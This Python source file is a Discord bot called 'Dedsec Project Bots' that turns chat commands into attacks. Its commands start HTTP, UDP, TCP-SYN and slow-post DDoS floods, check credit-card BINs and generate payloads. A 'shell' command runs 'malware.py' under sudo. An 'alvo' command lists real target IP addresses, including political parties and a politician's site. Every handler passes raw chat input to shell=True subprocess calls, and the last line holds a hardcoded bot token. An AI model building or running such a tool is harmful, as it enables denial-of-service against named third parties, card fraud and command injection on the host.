# coding: utf-8
# -*- coding: utf-8 -*-
import os
import discord
from discord.ext import commands
import requests
import io
import sys
import random
import asyncio
import signal
import subprocess

client = discord.Client()

ssid = "412229378513305600"


@client.event
async def on_ready():
    print('Dedsec Project Bots Created by Crypto')
    # print(client.user.name)
    # print(client.user.id)
    print('-----------')


@client.event
async def on_message(message):
    if message.content.lower().startswith('!comandos') or message.content.lower().startswith('comandos'):
        usageHELP = discord.Embed(

            title="Dedsec Project Bots Commands",
            color=0x3A9AFA,
            description="BOT: All Commands Tools Private: \n\n"
                        "Reload - Stop All Scripts DDoS and Tools. \n\n"

                        "##### DDoS/Botnet #####\n"
                        "Dedsechttp - PowerFull Http GET DDoS Headers :new:  \n"
                        "Dedsecudp - UDP DDOS FLOOD :new:  \n"
                        "Dedsectcp - TCP DDOS FLOOD :new:\n"
                        "Eyeblackhat - Hyper Layer 7 KeepAlive + NoCache DoS Test Tool Post Request GET ou POST ou Random.\n"
                        "Torblackhat - Slow post DDOS tool\n"
                        "Dedsecddos. - Powerfull Dedsec http ProxyList DDoS. \n"
                        "Doser - DDOS HTTP REQUESTS HTTP/HTTP :new:  \n\n"

                        "##### Checkers #####\n"
                        "Checkbin - Check Credit Card Bin \n"
                        "Checkcnpj - Check Consulta CNPJ \n"
                        "Checksite - Check se algum Site esta Online ou Offline.\n"
                        "Checkproxy - Check Proxy Squid.\n\n"


                        "##### Others Hacking Tools #####\n"
                        "Payload - Payload Generator :new:\n"
                        "Reverse - IP REVERSE RESOLVER :new:  \n"
                        "Crimeflare - Crimeflare Resolver :new:\n"
                        "Dedsecproxy - Get Proxy List Free \n"
                        "Dedsecsquid - Get Proxy Squid List\n"
                        "Dedsectorproxy - Get Proxy List Free \n"
                        "Criarssh - Cria uma Conta ssh 7 dias DESLIGADO.\n\n"

                        "Dedsec Project Bots All Scripts Coded by Crypto.")

        await message.channel.send( embed=usageHELP)

        ########################### CHECK SITE ###############################

    ############## CRIARSSH ###################

    if message.content.lower().startswith('criarsshus -u'):
        import subprocess

        scriptcreatessh = message.content.lower()
        scriptcreatessh = scriptcreatessh.replace("criarsshus", "criarsshus.py")

        subprocess.Popen("python3 " + scriptcreatessh, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        Verifysshcreate = discord.Embed(
            title="Dedsec Box Make SSH Servers",
            color=0x3A9AFA,
            description="Criando Conta USA Aguarde.."
        )

        await message.channel.send( embed=Verifysshcreate)

        import time
        time.sleep(10)

        arqread = open("SSHLOGUSA.txt", "r")
        readrespsite2sshBR = arqread.read()

        try:
            await message.channel.send( readrespsite2sshBR)

            arqwrite = open("SSHLOGUSA.txt", "w")
            arqwrite.write("")
            arqwrite.close()

        except discord.errors.HTTPException:

            arqwrite = open("SSHLOGUSA.txt", "w")
            arqwrite.write("")
            arqwrite.close()

            print("Exception ERROR! Parametros sem valor.")
            arq22 = open("SSHLOGUSA.txt", "w")
            arq22.write("[+] Oops.. Usuario ou Senha Digitados estao com Parametros Errados. \n"
                        "Digite criarssh para digitar corretamente.")
            arq22.close()

        #################################################################################3

    elif message.content.lower().startswith('criarssh'):
        startedcreatessh = discord.Embed(
            title="DEDSEC Box: Make Accounts SSH Servers :free:",
            color=0x3A9AFA,
            description="Usage: \n"
                        ":flag_us: SSH 5d Server USA: criarsshus -u <user> -s  <senha> :ballot_box_with_check: :new: :up: \n"
                        ":flag_fr: SSH 3d: Server FR: criarsshfr -u <user> -s  <senha>  :x:   \n"
                        ":flag_br: SSH 3d: Server BR: criarsshbr -u <user> -s <senha> :x:\n"
                        ":flag_us: SSH 5d: Server USA2: criarsshusa2 -u <user> -s  <senha> :x:  \n"
                        ":flag_eu: SSH 30d: Server EUA: criarssheua -u <user> -s <senha> :x: \n"
                        ":flag_cn: SSH 7d: Server Singapura: criarsshsq -u <usuario> -p <senha>  :x:  \n"
                        ":flag_ca: EM BREVE.\n"
                        "\n - ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        await message.channel.send( embed=startedcreatessh)

    #################################################################################3

    #################################################################################3

    if message.content.lower().startswith('hosts'):
        DigitoHosts = message.content.lower()

        VerifyHostsWait = discord.Embed(
            title="DEDSEC BOT - Hosts Operadoras",
            color=0x3A9AFA,
            description="Hosts Operadoras :new:\n\n"
                        "VIVO: sdp.vivo.com.br | portalrecarga.vivo.com.br/recarga\n\n"
                        "OI 4G: d1n212ccp6ldpw.cloudfront.net \n\n"
                        "Vivo 3G,4G: navegue.vivo.com.br/pre/ \n"
                        " portalrecarga.vivo.com.br/recarga \n"
                        " www.portalsva2.vivo.com.br/captive-static/tarif-def/pd/index.html \n\n"
                        "APN e Proxy Vivo: 52.5.40.73 | Proxy 187.8.166.33\n"
                        "By Crypto."
        )

        await message.channel.send( embed=VerifyHostsWait)

    if message.content.lower().startswith('payload '):
        import subprocess
        DigitoPayload = message.content.lower()

        DigitoPayload = DigitoPayload.replace("payload", "payload.py -h")

        subprocess.Popen("python " + DigitoPayload, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VerifyPayloadWait = discord.Embed(
            title="DEDSEC BOT Wait Please",
            color=0x3A9AFA,
            description="[+] Wait Please.."
        )

        await message.channel.send( embed=VerifyPayloadWait)

        import time
        time.sleep(2)

        arqpayloadgen = open("PayloadLogs.txt", "r")
        readPayload = arqpayloadgen.read()

        ResPayload = discord.Embed(
            title="DEDSEC BOT Pyaload",
            color=0x3A9AFA,
            description=readPayload + "\n - ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        arqpayloadgen.close()

        await message.channel.send(
                                  readPayload + "\n\nPayload Generator 2018 - \nBY @CRYPTO, EM BREVE MAIS OPÇÕES.\n")

    elif message.content.lower().startswith('payload'):

        Msgpayloadgenerator = discord.Embed(
            title="DEDSEC BOT - Payload Generator :new:",
            color=0x3A9AFA,
            description="Usage: payload <Host> :new: " + "\n - Coded by Crypto.")

        await message.channel.send( embed=Msgpayloadgenerator)

    ############################################################3

    if message.content.lower().startswith('checkproxy '):
        import subprocess

        scriptsitecheckproxy = message.content.lower()

        scriptsitecheckproxy = scriptsitecheckproxy.replace("checkproxy", "checkproxy.py -i").replace(":", " -p ")

        subprocess.Popen("python " + scriptsitecheckproxy, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VerifyproxyTable = discord.Embed(
            title=":globe_with_meridians: ᴡᴀɪᴛ ᴄʜᴇᴄᴋɪɴɢ ʏᴏᴜʀ ᴘʀᴏxʏ :globe_with_meridians:",
            color=0x3A9AFA,
            description=""
        )

        await message.channel.send( embed=VerifyproxyTable)

        import time
        time.sleep(16)

        arqproxycheck = open("ProxyCheckLog.txt", "r")
        readrespproxyport = arqproxycheck.read()

        respefcheckproxy = discord.Embed(
            title=":globe_with_meridians: ʏᴏᴜʀ ᴘʀᴏxʏ ʜᴀs ᴄʜᴇᴄᴋᴇᴅ :globe_with_meridians:",
            color=0x3A9AFA,
            description=readrespproxyport + "\n - ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        arqproxycheck.close()

        await message.channel.send( embed=respefcheckproxy)


    elif message.content.lower().startswith('checkproxy'):
        startedcheckproxy = discord.Embed(
            title="ᴅᴇᴅsᴇᴄ ʙᴏᴛ-ᴄʜᴇᴄᴋᴇʀ",
            color=0x3A9AFA,
            description="Usage: checkproxy <IP ex: 127.0.0.1:8080> :grinning: " + "\n - ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        await message.channel.send( embed=startedcheckproxy)

    ########################### CHECK SITE ###############################




    if message.content.lower().startswith('checksite '):
        import subprocess

        scriptcheckhttp = message.content.lower()

        scriptcheckhttp = scriptcheckhttp.replace("checksite", "checksite.py -s")

        global proc
        proc = subprocess.Popen("python " + scriptcheckhttp, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VerifysiteTable2 = discord.Embed(
            title="ᴡᴀɪᴛ ᴘʟᴇᴀsᴇ, ʏᴏᴜʀ sɪᴛᴇ ɪs ʙᴇɪɴɢ ᴠᴇʀɪғɪᴇᴅ..",
            color=0x3A9AFA,
            description=""
        )

        await message.channel.send( embed=VerifysiteTable2)

        import time
        time.sleep(18)

        arqvsite = open("CheckSiteLog.txt", "r")

        readrespstasite = arqvsite.read()

        respefchecksite = discord.Embed(
            title="ʏᴏᴜʀ sɪᴛᴇ ʜᴀs ʙᴇᴇɴ ᴄʜᴇᴄᴋᴇᴅ",
            color=0x3A9AFA,
            description=readrespstasite + "\n - ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        await message.channel.send( embed=respefchecksite)

        arqisup = open("CheckSiteLog.txt", "w")
        arqisup.write("")
        arqisup.close()


    elif message.content.lower().startswith('checksitet'):

        startedchecksite = discord.Embed(
            title="ᴅᴇᴅsᴇᴄ ʙᴏᴛ ᴄʜᴇᴄᴋsɪᴛᴇ",
            color=0x3A9AFA,
            description="Usage: checksite <http://site.com> :robot: " + "\n :spy:- ᴅᴇᴅsᴇᴄ ᴛᴇᴀᴍ.")

        await message.channel.send( embed=startedchecksite)

    ####################################################################################################

        #################################################################################################################

    if message.content.lower().startswith('dedsecproxy'):

        import subprocess
        global data

        scriptdeseddfdos = message.content.lower()

        SUCCESSRESULTPROXYLIST = discord.Embed(
            title="DEDSEC BOT PROXY ATUALIZADA by Crypto",
            color=0xE62228,
            description="PROXYs FOUND: \n")

        ERRORRESULTPROXYLIST = discord.Embed(
            title="DEDSEC BOT: TOR BLOCKED, 404 SERVER PROXY ERROR",
            color=0xE62228,
            description="TOR BLOCKED, 404 SERVER PROXY ERROR \n")

        VERIFYRESULTPROXY = discord.Embed(
            title="DEDSEC BOT PROXY LIST By Crypto",
            color=0xE62228,
            description="VERIFICANDO O SERVIDOR.. ")

        await message.channel.send( embed=VERIFYRESULTPROXY)

        import time
        time.sleep(7)

        try:
            await message.channel.send( embed=SUCCESSRESULTPROXYLIST)

        except:
            await message.channel.send( embed=ERRORRESULTPROXYLIST)

        try:
            subprocess.Popen("php " + scriptdeseddfdos + ".php", stdout=subprocess.PIPE, shell=True,
                             preexec_fn=os.setsid)
        except:
            await message.channel.send( embed=ERRORRESULTPROXYLIST)

        # arqproxy.readlines()
        #arq = open("proxylist.txt", "w")
        #arq.write("")
        #arq.close()
        i = 1;

        try:
            arqproxy = open('proxylist.txt', 'r')
            rtextoproxy = arqproxy.readlines()

            for linha in rtextoproxy:
                i += 1
                await message.channel.send( linha)
                if i >= 41:
                    arqproxy.close()
                    rtextoproxy.close()
                    break

        except:
            await message.channel.send( embed=ERRORRESULTPROXYLIST)

        ################## BOT CONSULTA BIN BY CRYPTO ####################

    if message.content.lower().startswith('checkbin '):
        import subprocess
        global data

        scriptconsultabin = message.content.lower()
        scriptconsultabin = scriptconsultabin.replace("checkbin", "checkbin.py -b")

        print(scriptconsultabin)

        subprocess.Popen("python3 " + scriptconsultabin, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VERIFYRESULTBIN = discord.Embed(
            title="BOT Consulta BIN by Crypto",
            color=0xE62228,
            description="Aguarde Verificando a BIN... ")

        await message.channel.send( embed=VERIFYRESULTBIN)

        import time
        time.sleep(8)

        time.sleep(5)

        arq = open("BINLOGS.txt", "r")
        rtextobin = arq.read()
        arq.close()

        SUCCESSRESULTBIN = discord.Embed(
            title="BOT Consulta BIN by Crypto",
            color=0xE62228,
            description="BIN Information: \n" + rtextobin)

        ERRORRESULTBIN = discord.Embed(
            title="BOT Consulta BIN by Crypto",
            color=0xE62228,
            description="O Host ERROR ou Esta Bloqueando o Tor. :disappointed_relieved: ")

        try:
            await message.channel.send( embed=SUCCESSRESULTBIN)

        except discord.errors.HTTPException:
            await message.channel.send( embed=ERRORRESULTBIN)

        process_name = "Python3"
        os.system('pkill ' + process_name)


    elif message.content.lower().startswith('checkbin'):
        startedconsulbin = discord.Embed(
            title="BOT Consulta BIN by Crypto",
            color=0xE62228,
            description="Usage: checkbin <BIN>  :laughing:")

        await message.channel.send( embed=startedconsulbin)

        ################## BOT CONSULTA CNPJ BY CRYPTO ####################

    if message.content.lower().startswith('checkcnpj '):
        import subprocess
        global data

        scriptconsultaCNPJ = message.content.lower()

        scriptconsultaCNPJ = scriptconsultaCNPJ.replace("checkcnpj", "checkcnpj.py -c")

        processCNPJ = subprocess.Popen("python3 " + scriptconsultaCNPJ, stdout=subprocess.PIPE, shell=True,
                                       preexec_fn=os.setsid)

        VERIFYRESULTCNPJ = discord.Embed(
            title="BOT Consulta CNPJ by Crypto",
            color=0xE62228,
            description="Aguarde Verificando o CNPJ.. ")

        await message.channel.send( embed=VERIFYRESULTCNPJ)

        import time
        time.sleep(5)

        arq = open("CNPJLOGS.txt", "r")
        rtextocnpj = arq.read()
        arq.close()

        SUCCESSRESULTCNPJ = discord.Embed(
            title="BOT Consulta CNPJ by Crypto",

            color=0xE62228,
            description="CNPJ Information: \n" + rtextocnpj)

        ERRORRESULTCNPJ = discord.Embed(
            title="BOT Consulta CNPJ by Crypto",
            color=0xE62228,
            description="O Host ERROR ou Esta Bloqueando o Tor. :disappointed_relieved: ")

        try:
            await message.channel.send( embed=SUCCESSRESULTCNPJ)

        except discord.errors.HTTPException:
            await message.channel.send( embed=ERRORRESULTCNPJ)

    elif message.content.lower().startswith('checkcnpj'):

        startedconsulcnpj = discord.Embed(
            title="BOT Consulta CNPJ by Crypto",
            color=0xE62228,
            description="Usage: checkcnpj <CNPJ>  :laughing:")

        await message.channel.send( embed=startedconsulcnpj)

    ################### AREA DDDOSSSS ########################################3

    ##### FULLLLLLL CODED botnet BY CRYPTO################################################################################################################

    #############



    if message.content.lower().startswith('dedsecddos '):
        import subprocess
        global data

        scriptdeseddfdos = message.content.lower()

        scriptdeseddfdos = scriptdeseddfdos.replace("dedsecddos", "dedsecddos.py -h")

        subprocess.Popen("python3 " + scriptdeseddfdos, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VERIFYRESULTDEDSECDPS = discord.Embed(
            title="BOT ATACANDO VIA PROXY LIST By Crypto",
            color=0xE62228,
            description="ATACANDO O SERVIDOR..")

        await message.channel.send( embed=VERIFYRESULTDEDSECDPS)

        ############# DDDOS DEDSEC PROXY $$$$$$$$$$$$$$$$$$$$$$$$$$
    elif message.content.lower().startswith('dedsecddos'):
        startedcdessedddos = discord.Embed(
            title="BOT Advanced DDoS Priv8 DedSecDDoS PROXY by Crypto",
            color=0xE62228,
            description="Usage: dedsecddos <http://ALVO.COM> -r <Processes> :laughing:")

        await message.channel.send( embed=startedcdessedddos)
    ######################################################################################################################

    if message.content.lower().startswith('reverse '):
        import subprocess
        global data

        scriptcfresolver = message.content.lower()

        scriptcfresolver = scriptcfresolver.replace("reverse", "reverse.py --all ")

        subprocess.Popen("python2 " + scriptcfresolver, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VERIFYRESULT = discord.Embed(
            title="Reverse IP Resolver",
            color=0x3A9AFA,
            description="Resolving Please Wait..")

        await message.channel.send( embed=VERIFYRESULT)

        import time
        time.sleep(8)

        arq = open("reverselog.txt", "r")
        ipresolve = arq.read()
        arq.close()

        RESOLVESUCCESSRESULT = discord.Embed(
            title="Reverse IP Resolver",
            color=0xE62228,
            description="RESULTADO: \n")

        await message.channel.send( embed=RESOLVESUCCESSRESULT)
        await message.channel.send( ipresolve)


    if message.content.lower().startswith('dedsecscan'):

        dedsecscanmsg = discord.Embed(
            title="DedsecScan - PORT SCANNER",
            color=0x3A9AFA,
            description="Usage: dedsecscan <HOST/IP>")

        await message.channel.send( embed=dedsecscanmsg)

        scriptscanner = message.content.lower()

        scriptscanner = scriptscanner.replace("dedsecscan", "dedsecscan.py")
        import subprocess

        subprocess.Popen("python " + scriptscanner, stdout=subprocess.PIPE, shell=True)


        import time
        time.sleep(10)

        arqport = open("portlogs.txt", "r")
        portscanaeq = arqport.read()
        arqport.close()

        SCANSUCCESSRESULT = discord.Embed(
            title="Dedsec Port Scanner",
            color=0xE62228,
            description="RESULTADO: \n" + portscanaeq)


        await message.channel.send( embed=SCANSUCCESSRESULT)


    if message.content.lower().startswith('crimeflaret '):
        import subprocess
        global data

        scriptcfresolver = message.content.lower()

        scriptcfresolver = scriptcfresolver.replace("crimeflaret", "crimeflare.rb --byp")

        subprocess.Popen("ruby " + scriptcfresolver, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        VERIFYRESULT = discord.Embed(
            title="Crimeflare Resolver",
            color=0xE62228,
            description="Please Wait. Verificando..")

        await message.channel.send( embed=VERIFYRESULT)

        import time
        time.sleep(18)

        arq = open("Crimeflarelog.txt", "r")
        cfresolve = arq.read()
        arq.close()

        SUCCESSRESULT = discord.Embed(
            title="Crimeflare Resolver",
            color=0xE62228,
            description="RESULTADO: \n" + cfresolve)
        await message.channel.send( embed=SUCCESSRESULT)




    elif message.content.lower().startswith('crimeflaret'):
        started53432 = discord.Embed(
            title="Crimeflare Resolver",
            color=0xE62228,
            description="Usage: crimeflare <Cloudflare HOST>  :laughing:")

        await message.channel.send( embed=started53432)

        #############################################################################

        # print (sys.stdin.readline())

        # if message.content.startsWith(PREFIX):
        # responsehttp = os.system("ping -c 1 " + http)

        # await client.change_presence(game=discord.Game(name="on grewoss.com"))
    #####

    # UDP DDOSER BY CRYPTO################################################################################################################

    # os.system("/usr/bin/perl " + scriptudp)



    if message.content.lower().startswith('alvo'):
        await message.channel.send( "## LISTA DE ALVOS DA DEDSEC ##\n\n"
                                                   "WEBCHEATS: 167.114.32.86 [CloudflareResolved] :new: √\n"
                                                   "GAMEPLAYRJ: 31.220.59.102 [CloudflareResolved] √\n"
                                                   "Patch Paladins: 52.45.199.105:443 √ \n"
                                                   "Movimento Bunda Livre(MBL): 54.207.77.122 [CloudflareResoled] √\n"
                                                   "MICHELTEMER: 162.243.106.141 [Cloudflre Don't Resolved] √\n"
                                                   "PSDB: 52.216.104.250 [Don't CloudflareDetected] √ \n"
                                                   "DEM.ORG.BR: 205.186.166.98 Address Changed [Don't Resolved] :x: ")

        # ERVA DDOSER BY CRYPTO  ################################################################################################################

    if message.content.lower().startswith('shell'):
        StartBash = discord.Embed(

            title="Server Terminal was Connected",
            color=0x0dea53,
            description="")

        scriptbash = message.content.lower()

        scriptreplace = scriptbash.replace("shell", "malware.py")

        import subprocess

        process = subprocess.Popen(
            "sudo python3 " + scriptreplace,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )

        await message.channel.send(embed=StartBash)




    if message.content.lower().startswith('torblackhat '):
        started = discord.Embed(

            title=":beginner: ᴛᴏʀʙʟᴀᴄᴋʜᴀᴛ - ʜᴛᴛᴘ-sʟᴏᴡᴘᴏsᴛ ʜʏᴘᴇʀ ᴍᴀssɪᴠᴇ ʀᴇᴠᴏʟᴛ ᴅᴅᴏs ᴀᴛᴀᴄᴋɪɴɢ... :beginner:",
            color=0xE62228,
            description="")


        scripttorddos = message.content.lower()

        scripttorddos = scripttorddos.replace("torblackhat", "torblackhat.py -t")

        await message.channel.send( embed=started)

        import subprocess

        POSTSlow = subprocess.Popen(
            "python2 " + scripttorddos,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )

    elif message.content.lower().startswith('torblackhat'):
        usagetorddos = discord.Embed(

            title=":beginner: ᴛᴏʀʙʟᴀᴄᴋʜᴀᴛ ɪɴsᴛʀᴜᴄᴛɪᴏɴs :beginner:",
            color=0x7E22E6,
            description="ᴜsᴀɢᴇ: ᴛᴏʀʙʟᴀᴄᴋʜᴀᴛ <ɪᴘ/ᴅᴏᴍᴀɪɴ> -ʀ <ᴛʜʀᴇᴀᴅs> -ᴘ <ᴘᴏʀᴛ> ")

        await message.channel.send( embed=usagetorddos)




    if message.content.lower().startswith('dedsectcp --'):

        startedtcpdedsecddos = discord.Embed(

            title=":beginner: ᴅᴇᴅsᴇᴄ ᴛᴄᴘғʟᴏᴏᴅ: sᴛᴀʀᴛɪɴɢ ᴛʜᴇ ʜʏᴘᴇʀғʟᴏᴏᴅ ɪɴ ᴛʜᴇ ᴡᴇʙsᴇʀᴠᴇʀ :beginner:",
            color=0xE62228,
            description="")

        menhttptcpdos = message.content.lower()

        scripttcpDEDSECdsddos = menhttptcpdos.replace("dedsectcp", "nping")

        await message.channel.send( embed=startedtcpdedsecddos)

        import subprocess

        handlededsectcpflood = subprocess.Popen(
            "sudo " + scripttcpDEDSECdsddos,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )

    elif message.content.lower().startswith('dedsectcp'):
        COMMANDTCPFLOOD = discord.Embed(
            title=":beginner: ᴅᴇᴅsᴇᴄғʟᴏᴏᴅ ᴄᴏᴍᴍᴀɴᴅs :beginner:",
            color=0xE62228,
            description="ᴜsᴀɢᴇ ᴄᴏᴍᴍᴀɴᴅs:\n"
                        "dedsectcp --tcp-connect -rate=90000 -c 900000 -q <alvo/IP> \n"
                        "dedsectcp --tcp-connect -rate=90000 -c 900000 --flags SYN -q <alvo/IP> -p 80"
                        "\n")

        await message.channel.send( embed=COMMANDTCPFLOOD)

    if message.content.lower().startswith('dedsecudp '):

        floodddosdedsecdas = discord.Embed(

            title=":beginner: ᴅᴇᴅsᴇᴄᴜᴅᴘ: ᴀᴛᴛᴀᴄᴋɪɴɢ ᴛʜᴇ sᴇʀᴠᴇʀ ᴡɪᴛʜ ᴜᴅᴘ ғʟᴏᴏᴅɪɴɢ :beginner:",
            color=0x268bd2,
            description="")

        floodddostoolmens = message.content.lower()

        scriptddosfloodedsec = floodddostoolmens.replace("dedsecudp", "dedsecudp.py")

        await message.channel.send( embed=floodddosdedsecdas)

        import subprocess

        handlededsecUDP = subprocess.Popen(
            'python2 ' + scriptddosfloodedsec,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )


    elif message.content.lower().startswith('dedsecudp'):
        commandfloodedsec = discord.Embed(
            title=":beginner: ᴅᴇᴅsᴇᴄᴜᴅᴘ ғʟᴏᴏᴅ :beginner:",
            color=0x268bd2,
            description="Usage Commands: \n"
                        "Sintax: dedsecudp <IP> <PORT> <THREADS> <SEC>")

        await message.channel.send( embed=commandfloodedsec)

    # os.system("/usr/local/bin/python2 " + script)

    if message.content.lower().startswith('doser -t'):
        startedtcpdedsecddos = discord.Embed(

            title="DOSER: Starting the shotings in webserver, Script Coded By CRYPTO.",
            color=0xE62228,
            description="DOSER: Starting the shotings in webserver Hyper Massive Revolt DDoS Tool :laughing:")

        doserddoshttp = message.content.lower()

        doserddoshttp = doserddoshttp.replace("doser", "doser.py")

        import subprocess

        proc = subprocess.Popen("python2 " + doserddoshttp, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        await message.channel.send( embed=startedtcpdedsecddos)

        ################################################################################################################
    elif message.content.lower().startswith('doser'):
        COMMANDHTTPsFLOOD = discord.Embed(
            title="DOSER DDOS",
            color=0xE62228,
            description="Sintax: doser -t 999 -p 'https://site.com' -ah 'Content-Type: application/json' ")

        await message.channel.send( embed=COMMANDHTTPsFLOOD)

    # ERVA DDOSER BY CRYPTO################################################################################################################

    if message.content.lower().startswith('eyeblackhat '):
        started33eye3 = discord.Embed(

            title="eyeblackhat: Starting the shotings in webserver, Script Coded By CRYPTO.",
            color=0xE62228,
            description="eyeblackhat: Starting the shotings in webserver Hyper Massive Revolt DDoS Tool :laughing:")

        scripteyeblack = message.content.lower()

        scripteyeblack = scripteyeblack.replace("eyeblackhat", "eyeblackhat.py")

        await message.channel.send( embed=started33eye3)

        import subprocess

        handlededsechttp = subprocess.Popen(
            "python2 " + scripteyeblack,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )

    elif message.content.lower().startswith('eyeblackhat'):
        usage542123 = discord.Embed(

            title="Usage Simple: eyeblackhat <http://www.site.com>",
            color=0x7E22E6,
            description="Simple: eyeblackhat <http://www.site.com> \n Advanced Usage: eyeblackhat <http://site.com> -w <workers> -s <sockets> -m <method get or post>")

        await message.channel.send( embed=usage542123)

        # DDoS = os.system("/usr/bin/python " + script)

        ################################################################################################################

        # ERVA DDOSER BY CRYPTO################################################################################################################

    if message.content.lower().startswith('dedsechttp http://'):

        started56ddos = discord.Embed(

            title=":beginner: ᴅᴇᴅsᴇᴄ ᴍᴀssɪᴠᴇ ᴅᴅᴏs ɪᴛ's ᴀᴛᴛᴀᴄᴋɪɴɢ ʏᴏᴜʀ ᴡᴇʙsɪᴛᴇ :beginner:",
            color=0xE62228,
            description="")

        menhttpdos = message.content.lower()

        menhttpdos = menhttpdos.replace("dedsechttp", "dedsechttp.py")

        await message.channel.send( embed=started56ddos)

        import subprocess

        handlededsechttp = subprocess.Popen(
            "python2 " + menhttpdos,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )


    elif message.content.lower().startswith('dedsechttp'):
        usage53INFO = discord.Embed(

            title=":beginner: ᴅᴇᴅsᴇᴄʜᴛᴛᴘ ʀᴇǫᴜᴇsᴛs ᴀᴛᴛᴀᴄᴋᴇʀ ʜᴛᴛᴘ ᴍᴇᴛʜᴏᴅ ɢᴇᴛ :beginner:",
            color=0x7E22E6,
            description="ᴜsᴀɢᴇ: ᴅᴇᴅsᴇᴄʜᴛᴛᴘ  http://alvo.com/ :beginner:")

        await message.channel.send( embed=usage53INFO)

        # mac /usr/local/bin/python2
        # linux /usr/bin/python

        ################################################################################################################

    # mac /usr/local/bin/python2
    # linux /usr/bin/python
    #################################################################################################################

    if message.content.lower().startswith('reload') or message.content.lower().startswith('stop'):
        usageRELOAD = discord.Embed(

            title="WARNING: BOT RELEASED",
            color=0xe67e22,
            description="WARNING: BOT Released, ALL Scripts BOT Stopeed. :robot:")

        script22222 = message.content.lower()

        await message.channel.send( embed=usageRELOAD)

        process_name = "python2"
        os.system('pkill ' + process_name)
        os.system('sudo killall nping')
        os.system('sudo pkill nping')
        os.system('sudo killall hping3')
        os.system('sudo pkill hping3')

        # proc1 = subprocess.Popen("python2 dedsecbot.py", stdout=subprocess.PIPE,
        #                        shell=True, preexec_fn=os.setsid)
        # proc1 = subprocess.Popen("python3 dedsecbot.py", shell=True)

        # sys.exit()

        # mac /usr/local/bin/python2
        # linux /usr/bin/python


client.run('NDEyMjI5Mzc4NTEzMzA1NjAw.DWHQTA.Y8jU56elL4cO4YYcjCJ-kzCMd2Q')
